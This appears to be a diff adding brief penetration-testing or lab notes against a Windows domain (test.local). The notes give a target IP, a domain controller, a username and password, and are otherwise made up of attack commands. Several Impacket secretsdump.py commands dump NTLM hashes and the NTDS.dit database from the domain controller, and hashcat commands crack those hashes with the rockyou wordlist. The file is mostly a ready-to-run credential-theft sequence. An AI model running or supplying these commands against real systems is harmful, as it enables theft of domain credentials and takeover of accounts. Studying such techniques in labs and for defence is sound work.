@@ -1,0 +1,19 @@
+
+Target IP: 10.10.10.2
+
+Domain Controller: 10.10.10.1
+
+Domain: test.local
+
+Username: john
+
+Password: password123
+
+secretsdump.py TEST.local/john:'password123'@10.10.10.2
+secretsdump.py TEST.local/john:'password123'@10.10.10.2 -just-dc-ntlm
+
+secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2
+
+
+hashcat -m 1000 ntds.txt /usr/share/wordlist/rockyou.txt
+hashcat -m 1000 ntds.txt /usr/share/wordlist/rockyou.txt --show
